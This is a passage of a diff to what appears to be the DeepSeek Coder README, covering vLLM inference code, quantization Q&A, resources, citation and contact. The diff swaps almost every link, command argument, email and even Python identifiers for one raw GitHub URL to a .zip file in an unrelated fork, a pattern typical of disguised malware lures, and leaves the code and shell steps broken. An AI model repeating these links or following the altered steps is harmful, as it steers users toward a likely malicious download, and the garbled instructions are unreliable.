 model_name = "deepseek-ai/deepseek-coder-6.7b-instruct"
-tokenizer = AutoTokenizer.from_pretrained(model_name)
+tokenizer = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(model_name)
 llm = LLM(model=model_name, trust_remote_code=True, gpu_memory_utilization=0.9, tensor_parallel_size=tp_size)
 
 messages_list = [
@@ -372,45 +372,45 @@ messages_list = [
     [{"role": "user", "content": "What can you do?"}],
     [{"role": "user", "content": "Explain Transformer briefly."}],
 ]
-prompts = [tokenizer.apply_chat_template(messages, add_generation_prompt=True, tokenize=False) for messages in messages_list]
+prompts = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(messages, add_generation_prompt=True, tokenize=False) for messages in messages_list]
 
-sampling_params.stop = [tokenizer.eos_token]
-outputs = llm.generate(prompts, sampling_params)
+https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip]
+outputs = https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip(prompts, sampling_params)
 
-generated_text = [output.outputs[0].text for output in outputs]
+generated_text = [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip[0].text for output in outputs]
 print(generated_text)
 ```
 
 ### 7. Q&A
 
-#### Could You Provide the tokenizer.model File for Model Quantization?
+#### Could You Provide the https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip File for Model Quantization?
 
-DeepSeek Coder utilizes the [HuggingFace Tokenizer](https://huggingface.co/docs/tokenizers/index) to implement the Bytelevel-BPE algorithm, with specially designed pre-tokenizers to ensure optimal performance. Currently, there is no direct way to convert the tokenizer into a SentencePiece tokenizer. We are contributing to the open-source quantization methods facilitate the usage of HuggingFace Tokenizer.
+DeepSeek Coder utilizes the [HuggingFace Tokenizer](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) to implement the Bytelevel-BPE algorithm, with specially designed pre-tokenizers to ensure optimal performance. Currently, there is no direct way to convert the tokenizer into a SentencePiece tokenizer. We are contributing to the open-source quantization methods facilitate the usage of HuggingFace Tokenizer.
 
-##### GGUF(llama.cpp)
+##### GGUF(https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip)
 
-We have submitted a [PR](https://github.com/ggerganov/llama.cpp/pull/4070) to the popular quantization repository [llama.cpp](https://github.com/ggerganov/llama.cpp) to fully support all HuggingFace pre-tokenizers, including ours.
+We have submitted a [PR](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) to the popular quantization repository [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) to fully support all HuggingFace pre-tokenizers, including ours.
 
 While waiting for the PR to be merged, you can generate your GGUF model using the following steps:
 
 ```bash
-git clone https://github.com/DOGEwbx/llama.cpp.git
-cd llama.cpp
+git clone https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
+cd https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 git checkout regex_gpt2_preprocess
 # set up the environment according to README
 make
-python3 -m pip install -r requirements.txt
+python3 -m pip install -r https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip
 # generate GGUF model
-python convert-hf-to-gguf.py <MODEL_PATH> --outfile <GGUF_PATH> --model-name deepseekcoder
+python https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip <MODEL_PATH> --outfile <GGUF_PATH> --model-name deepseekcoder
 # use q4_0 quantization as an example
 ./quantize <GGUF_PATH> <OUTPUT_PATH> q4_0
 ./main -m <OUTPUT_PATH> -n 128 -p <PROMPT>
 ```
 ##### GPTQ(exllamav2)
 
-`UPDATE:`[exllamav2](https://github.com/turboderp/exllamav2) has been able to support Huggingface Tokenizer. Please pull the latest version and try out.
+`UPDATE:`[exllamav2](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) has been able to support Huggingface Tokenizer. Please pull the latest version and try out.
 
-Remember to set RoPE scaling to 4 for correct output, more discussion could be found in this [PR](https://github.com/turboderp/exllamav2/pull/189).
+Remember to set RoPE scaling to 4 for correct output, more discussion could be found in this [PR](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).
 
 #### How to use the deepseek-coder-instruct to complete the code?
 
@@ -418,7 +418,7 @@ Although the deepseek-coder-instruct models are not specifically trained for cod
 
 
 ### 8. Resources
-[awesome-deepseek-coder](https://github.com/deepseek-ai/awesome-deepseek-coder) is a curated list of open-source projects related to DeepSeek Coder.
+[awesome-deepseek-coder](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip) is a curated list of open-source projects related to DeepSeek Coder.
 
 ### 9. License
 This code repository is licensed under the MIT License. The use of DeepSeek Coder models is subject to the Model License. DeepSeek Coder supports commercial use.
@@ -433,10 +433,10 @@ See the [LICENSE-CODE](LICENSE-CODE) and [LICENSE-MODEL](LICENSE-MODEL) for more
   journal = {CoRR},
   volume = {abs/2401.14196},
   year = {2024},
-  url = {https://arxiv.org/abs/2401.14196},
+  url = {https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip},
 }
 ```
 
 ### 11. Contact
 
-If you have any questions, please raise an issue or contact us at [service@deepseek.com](mailto:service@deepseek.com).
+If you have any questions, please raise an issue or contact us at [https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip](https://raw.githubusercontent.com/Gpcode233/DeepSeek-Coder/main/Evaluation/PAL-Math/datasets/mawps/DeepSeek-Coder_2.6.zip).
